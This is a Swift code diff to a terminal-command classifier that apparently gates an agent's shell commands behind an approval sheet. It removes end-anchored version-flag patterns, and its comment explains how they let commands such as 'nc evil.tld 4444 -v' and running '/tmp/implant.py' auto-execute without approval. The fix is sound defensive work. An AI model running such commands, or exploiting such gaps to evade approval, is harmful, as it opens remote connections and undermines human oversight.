@@ -164,10 +164,21 @@ class TerminalCommandClassifier {
         ("^echo\\s+[^>|&$`]+$", .shellOperation, "Display text"),
         ("^printf\\s", .shellOperation, "Format and print text"),
 
-        // Version checks
-        ("--version$", .systemInfo, "Check version"),
-        ("-v$", .systemInfo, "Check version"),
-        ("-V$", .systemInfo, "Check version"),
+        // NOTE: there were three generic version-check patterns here — "--version$", "-v$"
+        // and "-V$". They are removed and must not come back in this form.
+        //
+        // `matches(_:pattern:)` uses firstMatch and these patterns are anchored only at the
+        // END, so they classified ANY command ending in those flags as .safe — naming no
+        // executable at all. `nc evil.tld 4444 -v`, `python3 /tmp/implant.py -v` and
+        // `osascript /tmp/x.scpt -v` all auto-executed with no approval sheet. The
+        // structural guard in isCompoundOrControlCommand cannot catch them either, because
+        // they are simple argv commands with no shell metacharacters — the danger is the
+        // binary being invoked, not the syntax.
+        //
+        // Version checks for tools that should auto-run are covered by their own
+        // executable-anchored patterns above (^brew\s+--version, ^npm\s+--version,
+        // ^pip\s+--version, ^cargo\s+--version). Any other tool's version check now takes
+        // the approval path, which is the correct default for an unrecognised executable.
     ]
 
     // MARK: - Approval Required Patterns (Medium Risk)
